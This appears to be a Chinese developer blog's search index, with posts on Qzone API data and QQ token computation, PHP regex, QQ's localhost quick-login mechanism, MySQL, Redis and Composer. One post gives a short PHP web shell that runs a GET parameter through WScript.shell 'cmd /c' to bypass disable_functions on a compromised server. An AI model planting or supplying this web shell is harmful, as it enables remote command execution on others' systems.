"is_own": 0, "isFamousWhite": 1, "isQzoneUser": 0, "isAnnualVip": 0, "isSetNickGlint": 0, "medalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "descicon": "", "icon_width": 0, "icon_height": 0, "isSweetVip": 0, "stuStarInfo": &#123; "iStarStatus": 0, "iStarLevel": 0, "isAnnualVip": 0, "isHighStarVip": 0 &#125;, "stuCombineDiamondInfo": &#123; "iShowType": 0, "iVipLevel": 0, "isAnnualVip": 0, "isAnnualVipEver": 0 &#125;, "isSafeModeUser": 0, "vipShowType": 1, "namePlate": 0, "actiontype": 0, "actionurl": "", "decoration": &#123; "type": "Buffer", "data": [] &#125;, "tagInfos": [], "strPortraitId": "", "under_nickname_desc": "", "liveshowMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "uFansCount": 0, "uVisitorCount": 0, "isCmtVerifyOpen": 0, "iCurUserType": 0, "displayflag": 0, "vtime": 0, "authqzoneMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "eUserTypeReport": 0, "iVipActType": 0, "openid_users": &#123; "openid": "", "nickname": "", "logo": "" &#125;, "sex": 0 &#125;, "action_desc": "", "actiontype": 5, "luckyMoneyPics": [] &#125;, "id": &#123; "cellid": "8fa9d120c66ab55e0ac40000", "subid": "" &#125;, "summary": &#123;// 动态内容 "summary": "看看不同的风景，接触不同的人和事，你会发现，自己的烦恼原来是那么微不足道，自己的经历原来那么浅薄。学会给自己现实，不沉溺幻想，不庸人自扰，好好生活，做一个接近幸福的人。 ​​​​ ​", "hasmore": 0, "actiontype": 0, "summarypic": [], "more_info": "", "sparkleword": &#123; "sparkle_color": [], "span_time": 0, "extend_info": &#123;&#125;, "sparkle_id": "", "sparkle_json": "" &#125;, "mapExt": &#123;&#125;, "mapProtoExt": &#123;&#125;, "actionurl": "" &#125;, "pic": &#123; "picdata": [ &#123; "picname": "", "sloc": "", "lloc": "NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!", "photourl": &#123; "0": &#123; "url": "http://r.photo.store.qq.com/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/o&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=VQhABlUIQAYRECc!&amp;tl=1&amp;su=075897570&amp;vuin=QQ号码&amp;tm=1589274000#sce=5-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-0-0", "width": 2133, "height": 1600, "focus_x": 1066, "focus_y": 800, "enlarge_rate": 200, "size": 0, "md5": "" &#125;, "1": &#123; "url": "http://m.qpic.cn/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=VQhABlUIQAYRECc!&amp;tl=1&amp;su=075897570&amp;vuin=QQ号码&amp;tm=1589274000#sce=5-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-0-0", "width": 2133, "height": 1600, "focus_x": 1066, "focus_y": 800, "enlarge_rate": 200, "size": 0, "md5": "" &#125;, "11": &#123; "url": "http://m.qpic.cn/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/c&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=VQhABlUIQAYRECc!&amp;tl=1&amp;su=075897570&amp;vuin=QQ号码&amp;tm=1589274000#sce=5-11-2&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-0-0", "width": 512, "height": 384, "focus_x": 256, "focus_y": 192, "enlarge_rate": 200, "size": 0, "md5": "" &#125; &#125;, "type": 17, "ismylike": false, "likecount": 0, "commentcount": 0, "busi_param": &#123; "6": "http://user.qzone.qq.com/评论好友QQ/photo/相册ID/NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!", "30": "1", "35": "", "144": "http://user.qzone.qq.com/评论好友QQ/photo/相册ID/NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!_quan", "-1": "http://phototj.photo.store.qq.com/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/b&amp;bo=VQhABlUIQAYRECc!" &#125;, "clientkey": "", "isIndependentUgc": 0, "opsynflag": 128, "uUploadTime": 0, "modifytime": 0, "desc": "看看不同的风景，接触不同的人和事，你会发现，自己的烦恼原来是那么微不足道，自己的经历原来那么浅薄。学会给自己现实，不沉溺幻想，不庸人自扰，好好生活，做一个接近幸福的人。 ​​​​ ​", "orglikekey": "", "curlikekey": "", "cropinfo": &#123; "centerx_scale": 50, "centery_scale": 50 &#125;, "uploadUin": 0, "shoottime": 0, "flag": 0, "poi": &#123; "poi_id": "", "poi_x": "", "poi_y": "", "poi_name": "", "poi_address": "", "poi_type": 0, "region_name": "" &#125;, "facelist": [], "raw": 0, "isAutoPlayGif": false, "photoTag": [], "opmask": 3, "albumid": "相册ID", "piccategory": 0, "videoflag": 0, "videodata": &#123; "videoid": "", "videourl": "", "coverurl": &#123;&#125;, "actiontype": 0, "actionurl": "", "clientkey": "", "filetype": 0, "videotype": 0, "videotime": 0, "videourls": &#123;&#125;, "playtype": 0, "videostatus": 0, "toast": "", "extendinfo": &#123;&#125;, "videoremark": &#123; "iconurl": "", "icondesc": "", "remark": "", "actiontype": 0, "actionurl": "", "orgwebsite": 0 &#125;, "video_show_type": 0, "isPanorama": false, "video_source": 1, "sloc": "", "lloc": "", "report_video_feeds_type": 0, "videoplaycnt": 0, "is_share": false, "adv_delay_time": 0, "video_webview_url": "", "isOnWifiPlay": false, "isHadSetPlayOnWifi": false, "auto_refresh_second": 0, "vcCovers": [], "video_form": 0, "gaussPicUrl": &#123;&#125;, "weishi": &#123; "weishi_feedId": "", "weishi_fileId": "", "cover_url": "", "nick_name": "", "weishi_musicId": "", "weishi_musicName": "", "weishi_musicUrl": "", "weishi_topicID": "", "weishi_topicName": "", "weishi_topicUrl": "", "weishi_schema": "", "dc_report": &#123;&#125; &#125;, "stKingCard": &#123; "is_guide": false, "button_title": "", "jump_url": "" &#125;, "bottom_button": &#123; "text": "", "actiontype": 0, "actionurl": "", "button_img": "", "button_background_img": "", "button_icon": "", "stMapABTest": &#123;&#125;, "appear_time": 0, "duration_time": 0 &#125;, "video_click_type": 0, "header_desc": "", "video_rate_list": [], "cur_video_rate": 0 &#125;, "isCoverPic": false, "pic_host_nick": &#123; "uin": 0, "nick": "" &#125;, "luckyMoneyDesc": "", "geo": &#123; "poi_id": "", "poi_x": "", "poi_y": "", "poi_name": "", "poi_address": "", "poi_type": 0, "region_name": "" &#125;, "operation": &#123; "busi_param": &#123;&#125;, "weixin_url": "", "qq_url": "", "share_info": &#123; "title": "", "summary": "", "photourl": &#123;&#125;, "ark_sharedata": &#123; "ark_id": "", "view_id": "", "ark_content": "" &#125;, "action_url": "" &#125;, "schema_info": &#123; "actiontype": 0, "actionurl": "", "downloadurl": "", "appid": "", "postparams": "", "usepost": 0, "schemapageurl": "", "appname": "", "loadingpage": false, "yingyongbao": true, "master_actionurl": "" &#125;, "recomm_cookie": &#123;&#125;, "click_stream_report": &#123;&#125;, "qboss_trace": "", "custom_btn": [], "feed_report_cookie": &#123;&#125;, "generic_url": "", "bypass_param": &#123;&#125;, "droplist_cookie": &#123;&#125;, "rank_param": &#123;&#125;, "button_gif_url": "", "offline_resource_bid": 0 &#125;, "musicdata": &#123; "musicid": "", "musicurl": "", "coverurl": "", "width": 0, "height": 0, "title": "", "musictime": 0, "musicMId": "", "musicType": "", "musicMUrl": "" &#125;, "audio_summary": "", "batchid": 0, "quankey": "http://user.qzone.qq.com/评论好友QQ/photo/相册ID/NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!_quan", "origin_size": 0, "origin_width": 2133, "origin_height": 1600, "origin_phototype": 0, "binaryExtInfo": &#123;&#125;, "vecShowDryingTagInfo": [], "fashion_tag_key": "" &#125; ], "albumname": "", "albumid": "相册ID", // 图片存储的相册ID "albumnum": 0, "uploadnum": 1, "albumrights": 0, "albumquestion": "", "albumanswer": "", "desc": "", "uin": 评论好友QQ, "balbum": false, "lastupdatetime": 0, "busi_param": &#123;&#125;, "qunid": "", "allow_access": 0, "anonymity": 0, "albumtype": 0, "actiontype": 18, "actionurl": "", "isSubscribe": true, "friendinfo": &#123; "uin": 0, "nickname": "", "timestamp": 0, "from": 1, "uinkey": "", "logo": "", "vip": 0, "level": 0, "viplevel": 0, "viptype": 0, "qzonedesc": "", "is_owner": 0, "operation_mask": 0, "uid": "", "talk_id": "", "portrait_id": 0, "is_own": 0, "isFamousWhite": 0, "isQzoneUser": 0, "isAnnualVip": 0, "isSetNickGlint": 0, "medalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "descicon": "", "icon_width": 0, "icon_height": 0, "isSweetVip": 0, "stuStarInfo": &#123; "iStarStatus": 0, "iStarLevel": 0, "isAnnualVip": 0, "isHighStarVip": 0 &#125;, "stuCombineDiamondInfo": &#123; "iShowType": 0, "iVipLevel": 0, "isAnnualVip": 0, "isAnnualVipEver": 0 &#125;, "isSafeModeUser": 0, "vipShowType": -1, "namePlate": 0, "actiontype": 0, "actionurl": "", "decoration": &#123; "type": "Buffer", "data": [] &#125;, "tagInfos": [], "strPortraitId": "", "under_nickname_desc": "", "liveshowMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "uFansCount": 0, "uVisitorCount": 0, "isCmtVerifyOpen": 0, "iCurUserType": 0, "displayflag": 0, "vtime": 0, "authqzoneMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "eUserTypeReport": 0, "iVipActType": 0, "openid_users": &#123; "openid": "", "nickname": "", "logo": "" &#125;, "sex": 0 &#125;, "news": "", "unread_count": 0, "facemans": [], "faceman_num": 0, "store_appid": "", "extend_actiontype": 0, "extend_actionurl": "", "albshowmask": 0, "allow_share": 0, "individualalbum": 0, "activealbum": 0, "newestupload": 0, "is_share": false, "is_video_pic_mix": false, "is_contain_video_and_pic": false, "is_share_owner": true, "animation_type": 0, "sort_type": 0, "is_topped_album": false &#125;, "like": &#123; // 点赞列表 "num": 25, "isliked": 0, "likemans": [ &#123; "user": &#123; "uin": 点赞好友QQ, "nickname": "点赞好友昵称", "timestamp": 0, "from": 1, "uinkey": "", "logo": "", "vip": 0, "level": 0, "viplevel": 0, "viptype": 0, "qzonedesc": "", "is_owner": 0, "operation_mask": 0, "uid": "", "talk_id": "", "portrait_id": 0, "is_own": 0, "isFamousWhite": 0, "isQzoneUser": 0, "isAnnualVip": 0, "isSetNickGlint": 0, "medalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "descicon": "", "icon_width": 0, "icon_height": 0, "isSweetVip": 0, "stuStarInfo": &#123; "iStarStatus": 0, "iStarLevel": 0, "isAnnualVip": 0, "isHighStarVip": 0 &#125;, "stuCombineDiamondInfo": &#123; "iShowType": 0, "iVipLevel": 0, "isAnnualVip": 0, "isAnnualVipEver": 0 &#125;, "isSafeModeUser": 0, "vipShowType": -1, "namePlate": 0, "actiontype": 0, "actionurl": "", "decoration": &#123; "type": "Buffer", "data": [] &#125;, "tagInfos": [], "strPortraitId": "", "under_nickname_desc": "", "liveshowMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "uFansCount": 0, "uVisitorCount": 0, "isCmtVerifyOpen": 0, "iCurUserType": 0, "displayflag": 0, "vtime": 0, "authqzoneMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "eUserTypeReport": 0, "iVipActType": 0, "openid_users": &#123; "openid": "", "nickname": "", "logo": "" &#125;, "sex": 0 &#125;, "refer": "", "superflag": 0, "customPraise": &#123; "iItemId": 0, "strPraisePic": "", "metaDataCustom": &#123; "iItemId": 0, "strPraisePic": "", "strPraiseZip": "", "strPraiseComboZip": "", "iFrameRate": 0, "strPraiseButton": "", "customPraisetype": 0, "uiComboCount": 0, "subpraisetype": 0 &#125; &#125;, "cpolyPraise": &#123; "iItemId": 0, "strPicUrl": "", "strText": "", "itype": 0, "resourceId": 0 &#125; &#125; ... ] &#125;, "operation": &#123; "busi_param": &#123; "4": "", "5": "http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000", "6": "http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000", "16": "0", "23": "0", "30": "1", "48": "0", "52": "", "97": "&amp;feedtype1=1&amp;feedtype2=14&amp;feedtype3=1&amp;org_uniq_key=&amp;sUniqId=评论好友QQ_311_8fa9d120c66ab55e0ac40000&amp;fExposUniqId=&amp;colorexptid=0&amp;colorstrategyid=0", "101": "0=&amp;1=&amp;2=&amp;3=&amp;4=评论好友QQ&amp;5=&amp;6=0&amp;7=&amp;8=&amp;9=&amp;10=0&amp;76=", "104": "", "121": "&amp;feedtype1=1&amp;feedtype2=14&amp;feedtype3=1&amp;org_uniq_key=&amp;sUniqId=评论好友QQ_311_8fa9d120c66ab55e0ac40000&amp;fExposUniqId=&amp;colorexptid=0&amp;colorstrategyid=0", "141": "", "142": "1", "184": "看看不同的风景，接触不同的人和事，你会发现，自己的烦恼原来是那么微不足道，自己的经历原来那么浅薄。学会给自己现实，不沉溺幻想，不庸人自扰，好好生活，做一个接近幸福的人。 ​​​​ ​", "-100": "appid:311 typeid:0 feedtype:0 hostuin:QQ号码 feedskey:8fa9d120c66ab55e0ac40000 " &#125;, "weixin_url": "", "qq_url": "", "share_info": &#123; "title": "", "summary": "", "photourl": &#123;&#125;, "ark_sharedata": &#123; "ark_id": "", "view_id": "", "ark_content": "" &#125;, "action_url": "" &#125;, "schema_info": &#123; "actiontype": 0, "actionurl": "", "downloadurl": "", "appid": "", "postparams": "", "usepost": 0, "schemapageurl": "", "appname": "", "loadingpage": false, "yingyongbao": true, "master_actionurl": "" &#125;, "recomm_cookie": &#123; "0": "", "1": "", "2": "", "3": "", "4": "评论好友QQ", "5": "", "6": "0", "7": "", "8": "", "9": "", "10": "0", "19": "feedtype=17694976&amp;feed_uin=评论好友QQ", "76": "" &#125;, "click_stream_report": &#123;&#125;, "qboss_trace": "", "custom_btn": [], "feed_report_cookie": &#123; "1": "17694976", "2": "0", "3": "评论好友QQ_311_8fa9d120c66ab55e0ac40000", "4": "", "5": "", "6": "", "7": "", "8": "1588947653", "9": ",3,10", "11": "", "13": "", "15": "0", "16": "", "20": "1589276615", "21": "", "22": "", "29": "", "30": "", "31": "", "42": "", "47": "1", "48": "" &#125;, "generic_url": "", "bypass_param": &#123;&#125;, "droplist_cookie": &#123; "19": "feedtype=17694976&amp;feed_uin=评论好友QQ" &#125;, "rank_param": &#123;&#125;, "button_gif_url": "", "offline_resource_bid": 0 &#125;, "visitor": &#123; "view_count": 150, "visitor_count": 0, "visitors": [], "mod": 0, "view_count_byfriends": 0, "myfriend_info": "" &#125; &#125; ] &#125;&#125; 算法计算ptqrtoken12345678910111213141516&lt;?php /** * 计算ptqrtoken * @param string $qrSig 获取二维码的cookie中qrsig的值 * @return int */ function getPtQrToken($qrSig = '') &#123; $hash = 0; $qrSig = preg_split('/(?&lt;!^)(?!$)/u', $qrSig); foreach ($qrSig as $char) &#123; $hash += ((($hash &lt;&lt; 5) &amp; 0x7fffffff) + ord($char)) &amp; 0x7fffffff; &#125; return 0x7fffffff &amp; $hash; &#125;?&gt; 计算g_tk12345678910111213141516&lt;?php /** * 计算g_tk * @param string $p_skey 登录的Cookie中p_skey * @return int */ function getGTK($p_skey) &#123; $hash = 5381; $p_skey = preg_split('/(?&lt;!^)(?!$)/u', $p_skey); foreach ($p_skey as $char) &#123; $hash += ((($hash &lt;&lt; 5) &amp; 0x7fffffff) + ord($char)) &amp; 0x7fffffff; &#125; return $hash &amp; 0x7fffffff; &#125;?&gt;]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP独特的正则表达式]]></title>
    <url>%2Farticles%2FPHP%E7%8B%AC%E7%89%B9%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[code: 12// php 7.2.16var_dump(preg_match("/^[a-z]+$/", "abc\n")); // true 12// javascriptconsole.log("/^[a-z]+$/".test("abc\n")); // false 12// java(jdk11)System.out.println(Pattern.matches("^[a-z]+$", "abc\n")); // false Php使用的是 Perl特性的匹配规则，所以要想达到下面的效果需要在使用 /^[a-z]+$/n 或 /(*CRLF)^[a-z]+$/ php文档中关于此段的解释 https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php “Because Perl returns a string with a newline at the end when reading a line from a file, Perl’s regex engine matches $ at the position before the line break at the end of the string even when multi-line mode is turned off. Perl also matches $ at the very end of the string, regardless of whether that character is a line break. So ^\d+$ matches 123 whether the subject string is 123 or 123\n.” “D (PCRE_DOLLAR_ENDONLY) If this modifier is set, a dollar metacharacter in the pattern matches only at the end of the subject string. Without this modifier, a dollar also matches immediately before the final character if it is a newline (but not before any other newlines). This modifier is ignored if m modifier is set. There is no equivalent to this modifier in Perl.”]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[WindowsCom组件绕过disable_function的方法]]></title>
    <url>%2Farticles%2FWindowsCom%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87disable_function%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[window com组件(php 5.4)(高版本扩展要自己添加） 条件：要在php.ini中开启（如图） 利用代码，利用shell上传如下代码到目标服务器上 123456789101112131415&lt;?php$command=$_GET['a'];$wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能$exec = $wsh-&gt;exec("cmd /c ".$command); // 调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt; 利用成功后的结果]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[QQ如何实现跨端通信的]]></title>
    <url>%2Farticles%2FQQ%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E8%B7%A8%E7%AB%AF%E9%80%9A%E4%BF%A1%E7%9A%84%2F</url>
    <content type="text"><![CDATA[前言这个问题之前很好解决，使用浏览器 plugin 即可。 但是随着 Chrome 和 Firefox 都先后放弃了 NPAPI plugin，这一方法也行不通了，而且很多人是很讨厌 plugin 的。 但是在默认禁止了 NPAPI 的 Chrome 版本，QQ 依然可以实现快速登录（一键登录），是怎么做到的呢？ 原理其实不难猜。既然不存在 plugin，无法以此来实现浏览器内和本地客户端的直接通信，那么排除其他的黑科技，有一种很简单的方法可以实现这个效果。 那就是在客户端开一个 Server，在浏览器里面请求这个地址。 理论上这样是可以实现的，至于 QQ 是不是用的这种方法，稍微验证下好了。 验证找一个有 QQ 快速登陆的页面，比如 mail.qq.com登陆 QQ 客户端打开浏览器的 Developer Tools -&gt; Network 刷新页面，观察所有请求的 domain。 很明显，我们要找的完整请求 url 是这样的 https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.125114&amp;pt_local_tk=-2004781 看看这个请求的 Response Content 123456789101112var var_sso_uin_list=[ &#123; "account":"xxxxxx", "client_type":65793, "face_index":0, "gender":1, "nickname":"xxx", "uin":"xxx", "uin_flag":xxxxx &#125;];ptui_getuins_CB(var_sso_uin_list); 很明显是当前登录的用户信息, ping 一下这个请求的 domain, 不出所料结果是 127.0.0.1 123ping localhost.ptlogin2.qq.com// Pinging localhost.ptlogin2.qq.com [127.0.0.1] with 32 bytes of data 现在我们验证下是否是 QQ 开了这个 Server 查看哪个程序占用了 4301 端口 123netstat -ano | findstr &quot;4301&quot;// TCP 127.0.0.1:4301 0.0.0.0:0 LISTENING 4152 得到 pid 我们就可以看否是 QQ 在监听这个端口了 123tasklist | findstr &quot;4152&quot;// QQ.exe 4152 Console 1 178,616 K 可能有人担心会不会有安全问题，会不会其他网站访问这个 url 就拿走用户信息？其实挺容易解决，存一个 token 到服务器端，获取的时候校验下就好了。 但是归根到底取决于腾讯对这方面安全的重视程度和意愿了，至少之前是确实存在从网页上获取当前登录的 QQ 信息的方法，虽然问题不是出在快速登录这部分。 模拟接下来我用GOLang模拟这种技术实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package mainimport ( "fmt" "log" "io" "net" "net/http" "encoding/json")type Data struct&#123; Ip string Mac string&#125;type Ret struct&#123; Code int Msg string Data Data&#125; func getMacAddrs() (macAddrs []string) &#123; netInterfaces, err := net.Interfaces() if err != nil &#123; fmt.Printf("fail to get net interfaces: %v", err) return macAddrs &#125; for _, netInterface := range netInterfaces &#123; macAddr := netInterface.HardwareAddr.String() if len(macAddr) == 0 &#123; continue &#125; macAddrs = append(macAddrs, macAddr) &#125; return macAddrs&#125;func getIPs() (ips []string) &#123; interfaceAddr, err := net.InterfaceAddrs() if err != nil &#123; fmt.Printf("fail to get net interface addrs: %v", err) return ips &#125; for _, address := range interfaceAddr &#123; ipNet, isValidIpNet := address.(*net.IPNet) if isValidIpNet &amp;&amp; !ipNet.IP.IsLoopback() &#123; if ipNet.IP.To4() != nil &#123; ips = append(ips, ipNet.IP.String()) &#125; &#125; &#125; return ips&#125;func handleToken(w http.ResponseWriter, r *http.Request) &#123; log.Fatal("Request: ", r) data := Data&#123;Ip: getIPs()[0], Mac: getMacAddrs()[0]&#125; ret := new(Ret) ret.Code = 0 ret.Msg = "success" ret.Data = data ret_json,_ := json.Marshal(ret) w.Header().Set("Content-Type","text/json;charset=utf-8") io.WriteString(w, string(ret_json))&#125;func main() &#123; http.HandleFunc("/token", handleToken) err := http.ListenAndServe("localhost.ya2.top:1024", nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125; 其中域名 localhost.ya2.top 配置指向解析记录：127.0.0.1 测试效果: 搞定，这只是一个简单的DEMO，但是了解原理已经足够了。 欢迎大佬指正~]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql表字段信息查询]]></title>
    <url>%2Farticles%2Fmysql%E8%A1%A8%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[新建表以及添加表和字段的注释123456789create table t_user( ID INT(19) primary key auto_increment comment '主键', NAME VARCHAR(300) comment '姓名', CREATE_TIME date comment '创建时间') comment = '用户信息表'; 修改表/字段的注释123alter table t_user comment = '修改后的表注释信息(用户信息表)'alter table t_user modify column id int comment '主键ID'; –注意：字段名和字段类型照写就行 查询数据库所有表的详细信息(包括表的注释)123use information_schema;select * from TABLES where TABLE_SCHEMA='my_db'; –查询某一张表的 123use information_schema;select * from TABLES where TABLE_SCHEMA='my_db' and TABLE_NAME= 'auth_user'; 查询一张表的详细信息(包括字段注释,字段名称,类型等)123use information_schema;select * from information_schema.columns where table_schema ='my_db' and table_name = 'auth_user'; 注:还有一种方式: 12345show create table table_name;use my_db;show full columns from auth_user;]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Redis实现批量删除]]></title>
    <url>%2Farticles%2FRedis%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%2F</url>
    <content type="text"><![CDATA[redis-cli -h 主机地址 -a 鉴权 -n 0 -p 6379 –scan –pattern “正则表达式” | xargs -L 5000 redis-cli -h 主机地址 -a 鉴权-n 0 -p 6379 DEL]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Composer教程]]></title>
    <url>%2Farticles%2FComposer%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[安装 下载composer安装器 1php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');" 校验安装包是否正确(可选，以v1.9.3为例) 1php -r "if (hash_file('sha384', 'composer-setup.php') === 'e0012edf3e80b6978849f5eff0d4b4e4c79ff1609dd1e613307e16318854d24ae64f26d17af3ef0bf7cfb710ca74755a') &#123; echo 'Installer verified'; &#125; else &#123; echo 'Installer corrupt'; unlink('composer-setup.php'); &#125; echo PHP_EOL;" 注意hash值有版本差异 安装composer 1php composer-setup.php --install-dir=bin 卸载安装包(可选) 1php -r "unlink('composer-setup.php');" windows系统中 使用composer命令(可选) 新建 composer.bat 文件，内容为 @php “%~dp0composer.phar” %* 环境变量中添加composer.bat文件路径 国内镜像切换(可选) 1composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 更多参考 https://getcomposer.org/download/ 使用常用命令install 命令要使用 Composer，我们需要先在项目的目录下创建一个 composer.json 文件，文件描述了项目的依赖关系。 文件格式如下： 12345&#123; "require": &#123; "monolog/monolog": "1.2.*" &#125;&#125; 以上文件说明我们需要下载从 1.2 开始的任何版本的 monolog。 接下来只要运行以下命令即可安装依赖包： 如何发布包？ composer install require 命令除了使用 install 命令外，我们也可以使用 require 命令快速的安装一个依赖而不需要手动在 composer.json 里添加依赖信息： 1$ composer require monolog/monolog Composer 会先找到合适的版本，然后更新composer.json文件，在 require 那添加 monolog/monolog 包的相关信息，再把相关的依赖下载下来进行安装，最后更新 composer.lock 文件并生成 php 的自动加载文件。 update 命令update 命令用于更新项目里所有的包，或者指定的某些包： 1234567891011# 更新所有依赖$ composer update# 更新指定的包$ composer update monolog/monolog# 更新指定的多个包$ composer update monolog/monolog symfony/dependency-injection# 还可以通过通配符匹配包$ composer update monolog/monolog symfony/* 需要注意的时，包能升级的版本会受到版本约束的约束，包不会升级到超出约束的版本的范围。例如如果 composer.json 里包的版本约束为 ^1.10，而最新版本为 2.0。那么 update 命令是不能把包升级到 2.0 版本的，只能最高升级到 1.x 版本。关于版本约束请看后面的介绍。 remove 命令remove 命令用于移除一个包及其依赖（在依赖没有被其他包使用的情况下），如果依赖被其他包使用，则无法移除： 1234567$ composer remove monolog/monologLoading composer repositories with package informationUpdating dependencies (including require-dev)Package operations: 0 installs, 0 updates, 2 removals - Removing psr/log (1.0.2) - Removing monolog/monolog (1.23.0)Generating autoload files search 命令search 命令可以搜索包： 1$ composer search monolog 该命令会输出包及其描述信息，如果只想输出包名可以使用 –only-name 参数： 1$ composer search --only-name monolog show 命令show 命令可以列出当前项目使用到包的信息： 12345678# 列出所有已经安装的包$ composer show# 可以通过通配符进行筛选$ composer show monolog/*# 显示具体某个包的信息$ composer show monolog/monolog 基本约束精确版本我们可以告诉 Composer 安装的具体版本，例如：1.0.2，指定 1.0.2 版本。 范围通过使用比较操作符来指定包的范围。这些操作符包括：&gt;，&gt;=，&lt;，&lt;=，!=。 你可以定义多个范围，使用空格或者逗号 , 表示逻辑上的与，使用双竖线 || 表示逻辑上的或。其中与的优先级会大于或。 实例： &gt;=1.0 &gt;=1.0 &lt;2.0 &gt;=1.0 &lt;1.1 || &gt;=1.2 我们也可以通过使用连字符 - 来指定版本范围。 连字符的左边表明了 &gt;= 的版本，如果右边的版本不是完整的版本号，则会被使用通配符进行补全。例如 1.0 - 2.0 等同于 &gt;=1.0.0 &lt;2.1 （2.0相当于2.0.*），而1.0.0 - 2.1.0则等同于 &gt;=1.0.0 &lt;=2.1.0。 通配符可以使用通配符来设置版本。1.0.* 相当于 &gt;=1.0 &lt;1.1。 例子：1.0.* 波浪号 ~我们先通过后面这个例子去解释 ~ 操作符的用法：~1.2 相当于 &gt;=1.2 &lt;2.0.0，而 ~1.2.3 相当于 &gt;=1.2.3 &lt;1.3.0。对于使用Semantic Versioning作为版本号标准的项目来说，这种版本约束方式很实用。例如 ~1.2 定义了最小的小版本号，然后你可以升级2.0以下的任何版本而不会出问题，因为按照Semantic Versioning的版本定义，小版本的升级不应该有兼容性的问题。简单来说，~ 定义了最小的版本，并且允许版本的最后一位版本号进行升级（没懂得话，请再看一边前面的例子）。 例子：~1.2 需要注意的是，如果 ~ 作用在主版本号上，例如 ~1，按照上面的说法，Composer可以安装版本1以后的主版本，但是事实上是 ~1 会被当作 ~1.0 对待，只能增加小版本，不能增加主版本。 折音号 ^^操作符的行为跟Semantic Versioning有比较大的关联，它允许升级版本到安全的版本。例如，^1.2.3相当于&gt;=1.2.3 &lt;2.0.0，因为在2.0版本前的版本应该都没有兼容性的问题。而对于1.0之前的版本，这种约束方式也考虑到了安全问题，例如^0.3会被当作&gt;=0.3.0 &lt;0.4.0对待。例子：^1.2.3 版本稳定性如果你没有显式的指定版本的稳定性，Composer会根据使用的操作符，默认在内部指定为-dev或者-stable。例如： 约束 内部约束 1.2.3 =1.2.3.0-stable &gt;1.2 &gt;1.2.0.0-stable &gt;=1.2 &gt;=1.2.0.0-dev &gt;=1.2-stable &gt;=1.2.0.0-stable &lt;1.3 &lt;1.3.0.0-dev &lt;=1.3 &lt;=1.3.0.0-stable 1 - 2 &gt;=1.0.0.0-dev &lt;3.0.0.0-dev ~1.3 &gt;=1.3.0.0-dev &lt;2.0.0.0-dev 1.4.* &gt;=1.4.0.0-dev 